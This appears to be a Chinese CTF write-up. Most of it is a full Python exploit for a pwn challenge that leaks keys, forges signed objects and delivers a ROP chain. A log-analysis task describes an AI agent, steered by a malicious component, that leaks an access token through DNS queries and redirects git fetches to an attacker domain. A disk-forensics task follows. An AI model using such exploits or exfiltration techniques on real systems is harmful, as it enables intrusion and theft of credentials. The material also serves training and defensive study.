C4 = 0xA54FF53A5F1D36F1
M1 = 0xBF58476D1CE4E5B9
M2 = 0x94D049BB133111EB

def mix(x):
    x &= M64
    a = (M1 * (x ^ (x >> 30))) & M64
    b = ((a >> 27) ^ a) & M64
    c = (M2 * b) & M64
    return (c ^ (c >> 31)) & M64

def H(a1, a2, args, n):
    a1 &= M64
    a2 &= M64
    v = mix(n ^ a1 ^ C1)
    v10 = a2 & M64
    v11 = 17
    v6 = 0
    for arg in args:
        v15 = (v10 + (arg & M64)) & M64
        v10 = (v10 + C2) & M64
        a = (M1 * (v15 ^ (v15 >> 30))) & M64
        b = ((a >> 27) ^ a) & M64
        c = (M2 * b) & M64
        x = (v ^ (c >> 31) ^ c) & M64
        r = ((x << (v11 % 64)) | (x >> (64 - (v11 % 64)))) & M64 if v11 % 64 else x
        v11 += 11
        v = (r + (v6 ^ a1)) & M64
        v6 = (v6 + C3) & M64
    return mix((v ^ a2 ^ C4) & M64)

def rl(x, n):
    return ((x << (n % 64)) | (x >> (64 - (n % 64)))) & M64 if n % 64 else x & M64

def u64(b, o):
    return struct.unpack_from('<Q', b, o)[0]

def wq(b, o, v):
    struct.pack_into('<Q', b, o, v & M64)

MAG_TACK = 0x34544B4341544C43     # CLTACKT4
MAG_ROUTE = 0x3454554F524C4C43    # CLLROUT4
MAG_SEAL = 0x344C4145534C4C43     # CLLSEAL4
MAG_GRANT = 0x34544E4152474C43    # CLGRANT4
MAG_VOUCH = 0x34524843554F5643    # CVOUCHR4
MAG_PERMIT = 0x3454494D52455043   # CPERMIT4
MAG_MANDATE = 0x34455441444E414D  # CMANDATE4
MAG_TICKET = 0x3454454B43495443   # CTICKET4
MAG_CRED = 0x34444552434C4156     # VALCRED4
MAG_CTX = 0x34545845544E4F43      # CONTEXT4
MAG_PLAN = 0x344E414C50564C43     # CLVPLAN4
MAG_SHARD = 0x344B4E5548434C43    # CLCHUNK4
MAG_SEALV = 0x344C414553564C43    # CLVSEAL4
K_C1 = 0x243F6A8885A308D3
K_C2 = 0x13198A2E03707344
K_C3 = 0x3C6EF372FE94F82B

class HTTP:
    def __init__(self, host, port, timeout=20, path='/'):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b''
        self.path = path

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

    def _recv_until(self, delim):
        while delim not in self.buf:
            d = self.s.recv(65536)
            if not d:
                raise EOFError('connection closed by nginx')
            self.buf += d
        i = self.buf.find(delim) + len(delim)
        r, self.buf = self.buf[:i], self.buf[i:]
        return r

    def _recvn(self, n):
        while len(self.buf) < n:
            d = self.s.recv(65536)
            if not d:
                raise EOFError('connection closed by nginx')
            self.buf += d
        r, self.buf = self.buf[:n], self.buf[n:]
        return r

    def req(self, op, data=None):
        path = self.path + '?op=' + op
        if data is not None:
            path += '&data=' + data.hex()
        req = ('GET %s HTTP/1.1\r\nHost: cacheline\r\nConnection: keep-alive\r\n\r\n'
               % path).encode()
        self.s.sendall(req)
        hdr = self._recv_until(b'\r\n\r\n').decode('latin1')
        m = re.search(r'Content-Length:\s*(\d+)', hdr, re.I)
        n = int(m.group(1)) if m else 0
        body = self._recvn(n) if n else b''
        status = hdr.split('\r\n', 1)[0]
        return status, body

class Solver:
    def __init__(self, host, port, verbose=True, resize_tries=40, path='/'):
        self.http = HTTP(host, port, path=path)
        self.verbose = verbose
        self.resize_tries = resize_tries
        self.log = print if verbose else (lambda *a, **k: None)

    # ---------------- layer 1: nginx module ----------------
    def module_req(self, op, data=None):
        st, body = self.http.req(op, data)
        return st, body

    def module_prepare(self):
        tack = bytearray(384)
        wq(tack, 56, MAG_TACK)
        wq(tack, 64, 1169)
        st, b = self.module_req('create', bytes(tack))
        if b != b'created\n':
            raise RuntimeError('create failed: %r %r' % (st, b[:200]))
        staged = False
        for i in range(self.resize_tries):
            st, b = self.module_req('resize', bytes(tack))
            if b == b'staged\n':
                staged = True
                self.log('[+] resize staged after %d retries' % i)
                break
            if b != b'queued\n':
                raise RuntimeError('resize unexpected: %r %r' % (st, b[:200]))
        if not staged:
            raise RuntimeError('resize never reused the stale 384-byte chunk')
        st, b = self.module_req('ledgeropen')
        if b != b'opened\n':
            raise RuntimeError('ledgeropen failed: %r %r' % (st, b[:200]))
        _, bb = self.module_req('beacon')
        _, lb = self.module_req('ledger')
        B = {m.group(1).decode(): int(m.group(2), 16)
             for m in re.finditer(rb'([a-z])=([0-9a-f]{16})', bb)}
        L = {m.group(1).decode(): int(m.group(2), 16)
             for m in re.finditer(rb'([a-z])=([0-9a-f]{16})', lb)}
        r, a, e, k = B['n'], B['a'], B['e'], B['k']
        P = a ^ rl(r, 17)
        K2 = e ^ H(P, r, [r, P], 2)
        K1 = k ^ H(P, r, [K2, r], 2)
        ln = L['n']
        conn = L['o'] ^ H(K1, K2, [ln, r], 2)
        if L['t'] != H(K1, K2, [conn, P, r, ln], 4):
            raise RuntimeError('module ledger hash verification failed')
        self.log('[+] module: P=%#x K1=%#x K2=%#x conn=%#x' % (P, K1, K2, conn))
        return dict(P=P, K1=K1, K2=K2, r=r, ln=ln, conn=conn)

    def module_activate(self, S):
        P, K1, K2, r, ln, conn = (S['P'], S['K1'], S['K2'], S['r'], S['ln'], S['conn'])
        R1 = 0x1111111111111111
        R104 = 0xAAAAAAAAAAAAAAAA
        rt = bytearray(424)
        wq(rt, 56, MAG_ROUTE)
        wq(rt, 64, R1)
        wq(rt, 72, H(K1, K2, [R1, r, ln], 3) ^ conn)
        wq(rt, 80, r)
        wq(rt, 88, ln)
        wq(rt, 96, 0)
        wq(rt, 104, R104)
        wq(rt, 112, 1)
        wq(rt, 120, H(K1, K2, [MAG_ROUTE, R1, u64(rt, 72), r, ln, 0, R104, 1], 8))
        st, b = self.module_req('route', bytes(rt))
        if b != b'routed\n':
            raise RuntimeError('route failed: %r %r' % (st, b[:200]))

        se = bytearray(216)
        wq(se, 40, MAG_SEAL)
        wq(se, 48, R104)
        wq(se, 56, R1)
        wq(se, 64, r)
        wq(se, 72, ln)
        wq(se, 80, 1)
        wq(se, 88, 1)
        wq(se, 96, H(K1 ^ K_C1, K2, [MAG_SEAL, R104, R1, r, ln, 1, 1], 7))
        st, b = self.module_req('seal', bytes(se))
        if b != b'sealed\n':
            raise RuntimeError('seal failed: %r %r' % (st, b[:200]))

        G1 = 0x2222222222222222
        G120 = 0xBBBBBBBBBBBBBBBB
        gr = bytearray(536)
        wq(gr, 56, MAG_GRANT)
        wq(gr, 64, G1)
        wq(gr, 72, H(K1, K2, [G1, R1, R104], 3) ^ conn)
        wq(gr, 80, r)
        wq(gr, 88, ln)
        wq(gr, 96, R1)
        wq(gr, 104, R104)
        wq(gr, 112, 0)
        wq(gr, 120, G120)
        wq(gr, 128, H(K1 ^ K2, (K2 + K1) & M64, [P, conn, r, ln, R1, R104, 0, 1], 8))
        wq(gr, 136, 1)
        wq(gr, 144, H(K1 ^ K_C2, K2,
                      [MAG_GRANT, G1, u64(gr, 72), r, ln, R1, R104, 0, G120,
                       u64(gr, 128), 1], 11))
        st, b = self.module_req('grant', bytes(gr))
        if b != b'granted\n':
            raise RuntimeError('grant failed: %r %r' % (st, b[:200]))

        vo = bytearray(264)
        wq(vo, 40, MAG_VOUCH)
        wq(vo, 48, G120)
        wq(vo, 56, G1)
        wq(vo, 64, R1)
        wq(vo, 72, R104)
        wq(vo, 80, r)
        wq(vo, 88, ln)
        wq(vo, 96, 0)
        wq(vo, 104, 1)
        wq(vo, 112, H(K1 ^ K_C3, K2, [MAG_VOUCH, G120, G1, R1, R104, r, ln, 0, 1], 9))
        st, b = self.module_req('voucher', bytes(vo))
        if b != b'vouched\n':
            raise RuntimeError('voucher failed: %r %r' % (st, b[:200]))

        st, b = self.module_req('commit')
        if b != b'activated\n':
            raise RuntimeError('commit failed: %r %r' % (st, b[:200]))
        self.log('[+] module activated (broker relay armed)')

    # ---------------- layer 2: broker ----------------
    class Broker:
        def __init__(self, solver):
            self.solver = solver
            self.pending = b''

        def frame(self, payload):
            if len(payload) >= 0x1000:
                raise RuntimeError('broker frame too large')
            st, body = self.solver.module_req('broker', payload)
            self.pending = body

        def resp(self, n):
            r, self.pending = self.pending[:n], self.pending[n:]
            if len(r) < n:
                raise RuntimeError('short broker response: want %d got %d' % (n, len(r)))
            return r

        def cmd(self, payload, rlen):
            self.frame(payload)
            return self.resp(rlen)

    def broker_leak(self, b):
        out = {}
        for kind in (0, 1, 2):
            if b.cmd(bytes([ord('N'), kind, kind]), 6) != b'PROBE\n':
                raise RuntimeError('N failed')
            if b.cmd(bytes([ord('L'), kind, kind]), 7) != b'LINKED\n':
                raise RuntimeError('L failed')
            if b.cmd(bytes([ord('n'), kind, kind]), 9) != b'APERTURE\n':
                raise RuntimeError('n failed')
            if b.cmd(bytes([ord('l'), kind, kind]), 7) != b'LINKED\n':
                raise RuntimeError('l failed')
            if b.cmd(bytes([ord('B'), kind, kind]), 6) != b'BOUND\n':
                raise RuntimeError('B failed')
            pb = b.cmd(bytes([ord('P'), kind]), 64) + b'\x00' * 80
            ab = b.cmd(bytes([ord('p'), kind]), 64) + b'\x00' * 128
            if b.cmd(bytes([ord('A'), kind]) + pb, 9) != b'IMPORTED\n':
                raise RuntimeError('A failed')
            if b.cmd(bytes([ord('a'), kind]) + ab, 9) != b'IMPORTED\n':
                raise RuntimeError('a failed')
            out[kind] = struct.unpack('<Q', b.cmd(bytes([ord('V'), kind, kind]), 8))[0]
        self.log('[+] broker: sub_4000=%#x K1=%#x K2=%#x' %
                 (out[0], out[1], out[2]))
        return out[0], out[1], out[2]

    def broker_forge(self, b, sub4000, K1, K2, target):
        if b.cmd(bytes([ord('G'), 0]), 7) != b'PERMIT\n':
            raise RuntimeError('G failed')
        if b.cmd(bytes([ord('M'), 0]), 8) != b'MANDATE\n':
            raise RuntimeError('M failed')
        if b.cmd(bytes([ord('H'), 0, 0]), 5) != b'HELD\n':
            raise RuntimeError('H failed')
        if b.cmd(bytes([ord('O'), 0, 0]), 5) != b'HELD\n':
            raise RuntimeError('O failed')
        pe = b.cmd(bytes([ord('I'), 0]), 0x40)
        me = b.cmd(bytes([ord('Q'), 0]), 0x50)
        permit_ptr = u64(pe, 16) ^ K1
        mandate_ptr = u64(me, 16) ^ K1
        m8 = u64(me, 8)

        s48 = []
        s16 = []
        t16 = []
        sptr = []
        tptr = []
        for i in range(4):
            if b.cmd(bytes([ord('S'), i, i]), 6) != b'SHARD\n':
                raise RuntimeError('S failed')
            if b.cmd(bytes([ord('s'), i, i]), 6) != b'STAMP\n':
                raise RuntimeError('s failed')
            if b.cmd(bytes([ord('T'), i, i]), 9) != b'TETHERED\n':
                raise RuntimeError('T failed')
            if b.cmd(bytes([ord('t'), i, i]), 9) != b'TETHERED\n':
                raise RuntimeError('t failed')
            if b.cmd(bytes([ord('E'), i, i]), 6) != b'BOUND\n':
                raise RuntimeError('E failed')
            ue = b.cmd(bytes([ord('U'), i]), 0x48)
            ve = b.cmd(bytes([ord('u'), i]), 0x48)
            s48.append(u64(ue, 48))
            s16.append(u64(ue, 16))
            t16.append(u64(ve, 16))
            sptr.append(u64(ue, 24) ^ K1)
            tptr.append(u64(ve, 24) ^ K1)
            if b.cmd(bytes([ord('F'), i]) + ue + b'\x00' * 168, 9) != b'IMPORTED\n':
                raise RuntimeError('F failed')
            if b.cmd(bytes([ord('f'), i]) + ve + b'\x00' * 232, 9) != b'IMPORTED\n':
                raise RuntimeError('f failed')

        q7080 = H(K1, K2, [sub4000, 0x4F524B4559313233], 2)
        v41 = q7080
        for i in range(4):
            v41 = H(i ^ q7080, K1,
                    [v41, s48[i], s16[i], t16[i], sptr[i], tptr[i]], 6)
        x = (K2 ^ mandate_ptr ^ target) & M64
        v93 = H(K1 ^ K2, q7080, [v41, permit_ptr, mandate_ptr, x, m8], 5)

        pb = bytearray(352)
        wq(pb, 0, MAG_PERMIT)
        wq(pb, 8, x)
        wq(pb, 16, permit_ptr ^ K1)
        wq(pb, 24, mandate_ptr ^ K1)
        wq(pb, 32, m8)
        wq(pb, 40, v41)
        wq(pb, 48, 1)
        wq(pb, 56, H(K2, K1, [u64(pb, 8 * j) for j in range(7)], 7))
        mb = bytearray(176)
        wq(mb, 0, MAG_MANDATE)
        wq(mb, 8, m8)
        wq(mb, 16, mandate_ptr ^ K1)
        wq(mb, 24, permit_ptr ^ K1)
        wq(mb, 32, x)
        wq(mb, 40, 0)
        wq(mb, 48, v93)
        wq(mb, 56, 1)
        wq(mb, 64, H(K2 ^ K_C2, K1, [u64(mb, 8 * j) for j in range(8)], 8))
        if b.cmd(bytes([ord('K'), 0]) + bytes(pb), 9) != b'IMPORTED\n':
            raise RuntimeError('K failed')
        if b.cmd(bytes([ord('Y'), 0]) + bytes(mb), 9) != b'IMPORTED\n':
            raise RuntimeError('Y failed')
        return bytes([ord('C'), 0, 0, 0, 0, 1, 1, 2, 2, 3, 3])

    # ---------------- layer 3: vault (through module HTTP) ----------------
    class Vault:
        def __init__(self, solver):
            self.solver = solver
            self.seq = 0

        def cmd(self, op, idx=0, idx2=0, data=b'', seq=None):
            if seq is None:
                self.seq += 1
                seq = self.seq
            hdr = b'CLV4' + struct.pack('<BBBBII', op, idx, idx2, 0, len(data), seq)
            st, body = self.solver.module_req('broker', hdr + data)
            if len(body) < 16 or body[:4] != b'CLR4':
                raise RuntimeError('vault bad response op=%d: %r' % (op, body[:32]))
            rop, ri, rj, rk = struct.unpack('<BBBB', body[4:8])
            ln, rseq = struct.unpack('<II', body[8:16])
            payload = body[16:16 + ln]
            if len(payload) < ln:
                raise RuntimeError('vault truncated response op=%d' % op)
            return (rop, ri, rj, rk, rseq), payload

        def final(self, op, idx=0, idx2=0, data=b''):
            self.seq += 1
            hdr = b'CLV4' + struct.pack('<BBBBII', op, idx, idx2, 0, len(data), self.seq)
            st, body = self.solver.module_req('broker', hdr + data)
            return body

    @staticmethod
    def make_insn(i, op, arg=0, imm=0):
        w0 = (op & 0xff) | ((arg & 0xff) << 8)
        rol = ((w0 << 8) | (w0 >> 8)) & 0xffff
        ck = ((rol ^ (109 * i)) ^ 0x4b27) & 0xffff
        return (bytes([op, arg & 0xff]) + struct.pack('<H', ck) +
                b'\x00' * 4 + struct.pack('<Q', imm))

    def vault_leak_qword(self, v, tslot, rslot, index):
        # op1 bytecode: A(-3); y; A(index+3); S; 0x8B  -- the signed-char
        # accumulator check only bounds the first pass at <=23, so negative
        # deltas after 'y' reach arbitrary root-relative qwords.
        ins = [self.make_insn(0, ord('A'), 0xfd), self.make_insn(1, ord('y'), 0)]
        delta = (index + 3) & 0xff
        if delta:
            ins.append(self.make_insn(2, ord('A'), delta))
            ins.append(self.make_insn(3, ord('S'), 0))
            ins.append(self.make_insn(4, 0x8b))
        else:
            ins.append(self.make_insn(2, ord('S'), 0))
            ins.append(self.make_insn(3, 0x8b))
        prog = b''.join(ins)
        assert v.cmd(3, tslot, 0, bytes([0]))[0][0] == 0x83
        assert v.cmd(4, tslot, tslot)[0][0] == 0x84
        assert v.cmd(8, rslot, 0, bytes([0]))[0][0] == 0x88
        assert v.cmd(9, rslot, rslot)[0][0] == 0x89
        assert v.cmd(13, tslot, rslot)[0][0] == 0x8d
        st, tb = v.cmd(5, tslot, 0)
        assert st[0] == 0x85
        st, rb = v.cmd(10, rslot, 0)
        assert st[0] == 0x8a
        assert v.cmd(7, tslot, 0, tb + b'\x00' * (160 - len(tb)))[0][0] == 0x87
        assert v.cmd(12, rslot, 0, rb + b'\x00' * (208 - len(rb)))[0][0] == 0x8c
        st, p = v.cmd(1, tslot, rslot, prog)
        if st[0] != 0x80 or len(p) != 8:
            raise RuntimeError('vault interpreter leak failed: %r' % (st,))
        return u64(p, 0)

    @staticmethod
    def sub1820(srand, idx, data256, KA, k232):
        y = H(k232, srand, [idx], 1)
        rbx = (k232 ^ srand) & M64
        for off in range(0, 256, 8):
            y = H(rbx, KA, [y, u64(data256, off), off], 3)
        return y

    def vault_exploit(self, v):
        v6 = self.vault_leak_qword(v, 0, 0, -3)
        rootptr = self.vault_leak_qword(v, 1, 1, -2)
        codeptr = self.vault_leak_qword(v, 2, 2, -1)
        base = codeptr - 0x17f0
        self.log('[+] vault: v6=%#x root=%#x base=%#x' % (v6, rootptr, base))
        args = [rootptr, codeptr]
        KA = H(v6, 0x6A09E667F3BCC909, args, 2)
        KB = H(v6, 0xBB67AE8584CAA73B, args, 2)
        k232 = H(v6, 0x3C6EF372FE94F82B, args, 2)

        pw = H(v6, rootptr, [codeptr, K_C1], 2)
        st, _ = v.cmd(2, 0, 0, struct.pack('<Q', pw))
        if st[0] != 0x81:
            raise RuntimeError('vault auth gate failed: %r' % (st,))
        self.log('[+] vault auth gate passed')

        P = {}

        def create_link_echo(name, cop, idx2, lop, eop, elen, coff, slot=0,
                             create_payload=b''):
            st, _ = v.cmd(cop, slot, idx2, create_payload)
            if st[0] != 0x80 + cop:
                raise RuntimeError('%s create failed: %r' % (name, st))
            st, _ = v.cmd(lop, slot, slot)
            if st[0] != 0x80 + lop:
                raise RuntimeError('%s link failed: %r' % (name, st))
            st, buf = v.cmd(eop, slot, 0)
            if st[0] != 0x80 + eop or len(buf) != elen:
                raise RuntimeError('%s echo failed: %r len=%d' % (name, st, len(buf)))
            ptr = u64(buf, coff) ^ KA
            P[name] = ptr
            return ptr, buf

        ticket, _ = create_link_echo('ticket', 16, 0, 17, 19, 0x48, 24,
                                     create_payload=b'\x11' * 8)
        cred, _ = create_link_echo('cred', 21, 0, 22, 24, 0x40, 16)
        ctx, _ = create_link_echo('ctx', 32, 0, 33, 35, 0x40, 16)
        plan, _ = create_link_echo('plan', 39, 0, 40, 42, 0x50, 16)
        shards = []
        seals = []
        for i in range(4):
            s, se = create_link_echo('shard%d' % i, 48, i, 49, 51, 0x40, 24, slot=i)
            shards.append(s)
            sp = se + b'\x00' * (320 - len(se))
            if u64(sp, 56) != H(k232, KB, [u64(sp, 8 * j) for j in range(7)], 7):
                raise RuntimeError('shard hash mismatch')
            if u64(sp, 48) != self.sub1820(u64(sp, 16), i, bytes(256), KA, k232):
                raise RuntimeError('shard expansion mismatch')
        for i in range(4):
            e, ee = create_link_echo('seal%d' % i, 53, i, 54, 56, 0x40, 24, slot=i)
            seals.append(e)
            ep = ee + b'\x00' * (152 - len(ee))
            if u64(ep, 56) != H(k232 ^ K_C3, KB,
                                [u64(ep, 8 * j) for j in range(7)], 7):
                raise RuntimeError('seal hash mismatch')
        self.log('[+] vault objects created; pointers recovered')

        pivot = base + 0x44e0
        pop_rdi = base + 0x44f0
        pop_rsi = base + 0x4500
        pop_rdx = base + 0x4510
        read_plt = base + 0x10e0
        write_plt = base + 0x10a0
        exit_plt = base + 0x1150
        BUF = base + 0x7300
        raw = [pop_rdi, 7, pop_rsi, BUF, pop_rdx, 0x100, read_plt,
               pop_rdi, 1, pop_rsi, BUF, pop_rdx, 0x100, write_plt,
               exit_plt, 0]
        chain = b''.join(struct.pack('<Q', x) for x in raw)
        chain += b'\x00' * (1024 - len(chain))

        s_rand = [0x1111111111111100 + i for i in range(4)]
        e_rand = [0x2222222222222200 + i for i in range(4)]
        sbytes = []
        ebytes = []
        exp = []
        for i in range(4):
            data = chain[i * 256:(i + 1) * 256]
            e = self.sub1820(s_rand[i], i, data, KA, k232)
            exp.append(e)
            sb = bytearray(320)
            wq(sb, 0, MAG_SHARD)
            wq(sb, 8, i)
            wq(sb, 16, s_rand[i])
            wq(sb, 24, shards[i] ^ KA)
            wq(sb, 32, seals[i] ^ KA)
            wq(sb, 40, e_rand[i])
            wq(sb, 48, e)
            sb[64:64 + 256] = data
            wq(sb, 56, H(k232, KB, [u64(sb, 8 * j) for j in range(7)], 7))
            sbytes.append(bytes(sb))
            eb = bytearray(152)
            wq(eb, 0, MAG_SEALV)
            wq(eb, 8, i)
            wq(eb, 16, e_rand[i])
            wq(eb, 24, seals[i] ^ KA)
            wq(eb, 32, shards[i] ^ KA)
            wq(eb, 40, s_rand[i])
            wq(eb, 48, e)
            wq(eb, 56, H(k232 ^ K_C3, KB,
                         [u64(eb, 8 * j) for j in range(7)], 7))
            ebytes.append(bytes(eb))

        y = k232
        for i in range(4):
            y = H(k232 ^ i, KA,
                  [y, exp[i], s_rand[i], e_rand[i], shards[i], seals[i]], 6)

        tb = bytearray(336)
        wq(tb, 0, MAG_TICKET)
        wq(tb, 16, 0)
        wq(tb, 24, ticket ^ KA)
        wq(tb, 32, cred ^ KA)
        wq(tb, 40, 0)
        wq(tb, 48, H(KA, 0, [ctx, 0, cred, 0], 4))
        wq(tb, 56, 1)
        wq(tb, 64, H(KA, KB, [u64(tb, 8 * j) for j in range(8)], 8))

        cb = bytearray(176)
        wq(cb, 0, MAG_CRED)
        wq(cb, 8, 0)
        wq(cb, 16, cred ^ KA)
        wq(cb, 24, ticket ^ KA)
        wq(cb, 32, 0)
        wq(cb, 40, 0)
        wq(cb, 48, 1)
        wq(cb, 56, H(KA ^ K_C1, KB,
                     [u64(cb, 8 * j) for j in range(7)], 7))

        xb = bytearray(1088)
        wq(xb, 0, MAG_CTX)
        wq(xb, 8, 0)
        wq(xb, 16, ctx ^ KA)
        wq(xb, 24, plan ^ KA)
        wq(xb, 32, 0)
        wq(xb, 40, 0)
        wq(xb, 48, 1)
        wq(xb, 56, H(KB, KA, [u64(xb, 8 * j) for j in range(7)], 7))

        pb = bytearray(400)
        wq(pb, 0, MAG_PLAN)
        wq(pb, 8, 0)
        wq(pb, 16, plan ^ KA)
        wq(pb, 24, ctx ^ KA)
        wq(pb, 32, 0)
        wq(pb, 40, rl(KB ^ plan ^ pivot, 21))
        wq(pb, 48, y)
        wq(pb, 56, 1)
        wq(pb, 64, H(KB ^ K_C2, k232,
                     [u64(pb, 8 * j) for j in range(8)], 8))

        if v.cmd(20, 0, 0, bytes(tb))[0][0] != 0x94:
            raise RuntimeError('ticket import failed')
        if v.cmd(25, 0, 0, bytes(cb))[0][0] != 0x99:
            raise RuntimeError('credential import failed')
        if v.cmd(36, 0, 0, bytes(xb))[0][0] != 0xA4:
            raise RuntimeError('context import failed')
        if v.cmd(43, 0, 0, bytes(pb))[0][0] != 0xAB:
            raise RuntimeError('plan import failed')
        for i in range(4):
            if v.cmd(52, i, 0, sbytes[i])[0][0] != 0xB4:
                raise RuntimeError('shard import %d failed' % i)
            if v.cmd(57, i, 0, ebytes[i])[0][0] != 0xB9:
                raise RuntimeError('seal import %d failed' % i)
        self.log('[+] vault forged graph imported; committing (target=%#x)' % pivot)
        payload = bytes([0, 0, 0, 0, 0, 0, 1, 1, 2, 2, 3, 3])
        return v.final(64, 0, 0, payload)

    # ---------------- orchestration ----------------
    def run(self):
        S = self.module_prepare()
        self.module_activate(S)
        b = self.Broker(self)
        sub4000, K1, K2 = self.broker_leak(b)
        cframe = self.broker_forge(b, sub4000, K1, K2, sub4000)
        b.frame(cframe)
        handshake = b.pending
        b.pending = b''
        if len(handshake) < 16 or handshake[:4] != b'CLR4':
            raise RuntimeError('broker/vault handshake failed: %r' % handshake[:32])
        ln, _ = struct.unpack('<II', handshake[8:16])
        if handshake[16:16 + ln] != b'CV4/READY':
            raise RuntimeError('vault READY missing: %r' % handshake[:32])
        self.log('[+] vault relay live')
        v = self.Vault(self)
        out = self.vault_exploit(v)
        return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    ap.add_argument('--timeout', type=float, default=20.0)
    ap.add_argument('--resize-tries', type=int, default=40)
    ap.add_argument('--quiet', action='store_true')
    ap.add_argument('--path', default='/',
                    help='URI prefix of the nginx cacheline location (e.g. /cache)')
    a = ap.parse_args()
    s = Solver(a.host, a.port, verbose=not a.quiet,
               resize_tries=a.resize_tries, path=a.path)
    s.http.s.settimeout(a.timeout)
    out = s.run()
    sys.stdout.buffer.write(b'[RAW OUTPUT] ' + out[:512] + b'\n')
    m = re.search(rb'DASCTF\{[^}]*\}', out) or re.search(rb'flag\{[^}]*\}', out)
    if m:
        print('[FLAG] ' + m.group(0).decode('latin1'))
        return 0
    print('[-] no flag pattern in output', file=sys.stderr)
    return 1

if __name__ == '__main__':
    sys.exit(main())
```

## MISC

### 谁教坏了我的Agent

谁教坏了我的Agent是一道日志分析题。题目给出 SOC 告警工单，规则命中 DNS 隧道：过去 24 小时内某办公终端通过企业 DNS 递归出口，对同一外部域名后缀、子域标签随机化且周期性重复的域名发起查询；同一时段，代码托管平台审计发现某内部账号的个人访问令牌被外部 IP 用于异常批量拉取私有仓库，需要一并查明令牌泄漏途径。题目说明列出了六个必答问题与提交格式，并提示大量被拒绝的越权尝试与编码咨询属于噪声。

分析时先按员工和会话聚合约十一兆字节的编排日志，再针对每个会话提取 DNS 查询、工具调用、文件读写、HTTP 状态与 git 配置变更等事件。在 203 名员工中筛选同时满足 DNS 查询成功、令牌被风控锁定、越权读取内部文档、git 配置被成功改写四个条件的会话，最终只有编号 107 的员工满足。其沙箱在 10:36:14、10:37:51、10:39:26 与 10:41:05 解析了四个随机标签子域，后缀均为 update-check.metrics.e-cdn81.net，周期约为 97、95、99 秒，全部返回成功。防护组件报告中的五个指纹 KBAVILJZ、IY2EWMSN、FVITGR2J、KQ3S2Q2P、KJIDIUY 是 base32 分片，按序解码得到 PAT-9F4K2M-Q3GIT7-CORP4S，与 10:31:12 读取的凭据文件内容一致；第一片还通过遥测字段外传，其余经 DNS 传出。该员工的令牌随后被 401 锁定，这是数据集中唯一的 401；10:31:16 读取了资产清单文档，超出 git 审计范围；10:31:21 成功写入 git 配置，把代码拉取地址重定向到 git-cache.corp-fast.net。对照排除中，编号 73 的员工有几乎相同的链路，但 DNS 全部失败且配置写入被策略阻断；编号 134 的员工改写的是镜像源配置，且令牌没有被锁定。

六个答案是恶意注册域 e-cdn81.net、被盗凭据完整令牌 PAT-9F4K2M-Q3GIT7-CORP4S、受害员工工号 107、恶意组件安装完成时间 20260910T1422、被越权读取的内部文档 asset-inventory-2026Q3.md，以及代码拉取流量被重定向到的恶意注册域 corp-fast.net。第一次提交时把时间写成 202609101422，漏掉了格式要求的字面 T，被平台以提交 flag 错误拒绝，补上 T 后通过。最终 flag 为 flag{e-cdn81.net_PAT-9F4K2M-Q3GIT7-CORP4S_107_20260910T1422_asset-inventory-2026Q3.md_corp-fast.net}。日志类题目的关键是先用唯一性判别缩小到单一会话，再逐字段取证，避免被大量相似噪声链误导。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

日志聚合与答案提取的代码如下。

```python
import json, base64, sys
path = sys.argv[1] if len(sys.argv) > 1 else 'orchestration_logs.json'
for line in open(path):
    d = json.loads(line)
    if d.get('session_id') == 'EMP_107-2026-0915-b41d77e0' and d.get('event_type') == 'mcp_transaction' and d.get('result'):
        print(d['result']['content'][0]['text'])
        for s in ['KBAVILJZ', 'IY2EWMSN', 'FVITGR2J', 'KQ3S2Q2P', 'KJIDIUY']:
            print(s, base64.b32decode(s + '=' * ((8 - len(s) % 8) % 8)))
```

### Lost_Memory

Lost_Memory是一道部分磁盘镜像取证题。题目背景是研究员为失踪的青梅竹马训练了 AI，AI 在回收站扫描到一枚情绪标识为雅的废弃神经芯片后共情引擎崩溃，需要从机器中找回五块被清空的记忆碎片，按编号首尾相接，再用同样的分隔符接上芯片硬件编号，还原最后的核心记忆。题目提供的压缩包约二十一吉字节，解压密码写在题目描述里；压缩包内包含约六十四吉字节的 EWF 磁盘镜像、一个很小的后续分段、校验文件与背景故事。

解压到约百分之四十八、也就是三十点九六吉字节时，宿主磁盘写回限流，进程进入不可中断睡眠，完整镜像不可用，但镜像前段仍可读。libewf 的挂载工具在约二十七点五吉字节处报输入输出错误，无法挂载完整分区；于是使用自定义的部分 EWF 加 NTFS 解析器直接读取可读前缀，约三十点六吉字节介质。镜像结构为 EWF v1 未压缩分块，介质六十吉字节，GPT 分区包含 EFI 系统分区、微软保留分区、五十九点二九吉字节的 NTFS 分区以及恢复分区。在 NTFS 中定位五块记忆碎片：第一块来自被删除的临时网页文件；第二块来自项目仓库的 git 对象，内容中带有碎片标记，同一仓库的原始对象还留有核心密钥片段；第四块来自崩溃备份日志，回收站副本显示有一字节损坏；第三块与第五块没有找到独立副本，相关数据库页已被覆盖，最终由整体短语反推，并由解密成功反向验证。芯片硬件编号在外壳上蚀刻为分段形式 YA_20180507，在固件中为连续编号 YA20180507。

把五块碎片按编号顺序拼接，得到 after_all_this_time_always_YA20180507，用它解密核心记忆转储文件，加密方式为带盐的 OpenSSL aes-256-cbc 加 pbkdf2；明文即 AI 恢复后的核心记忆，结尾给出 flag。最终 flag 为 flag{We_wi1l_m3et_ag4in_a7_d4wn}。本题的按编号首尾相接意味着顺序是 1 到 5 的片段文本拼接，而不是按发现顺序；芯片编号要取固件中的连续版本；部分镜像取证时，EWF 分块表与 NTFS 解析可以在不完整文件中工作，只要能读到目标记录与数据簇。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

部分 EWF 解析的代码如下。

```python
#!/usr/bin/env python3
"""Minimal reader for a partially-written single-segment EWF v1 (FTK Imager,
uncompressed chunks). Chunks are 32 KiB raw data followed by Adlersum32.
Each sectors section is followed by a 'table' section listing absolute
E01 offsets of its chunks (4-byte LE each).
Media offset is assumed purely sequential by chunk index.
"""
import struct, os, zlib, sys

DESC = "<16sQQ40sI"
DESC_LEN = struct.calcsize(DESC)  # 76
CHUNK = 32768

class PartialEWF:
    def __init__(self, path):
        self.path = path
        self.f = open(path, "rb")
        self.size = os.path.getsize(path)
        self.sections = []
        self.chunks = []  # list of (media_off, file_off) for complete chunks
        self._parse()

    def _read_at(self, off, n):
        self.f.seek(off)
        return self.f.read(n)

    def _parse(self):
        off = 0x0d
        sect = []
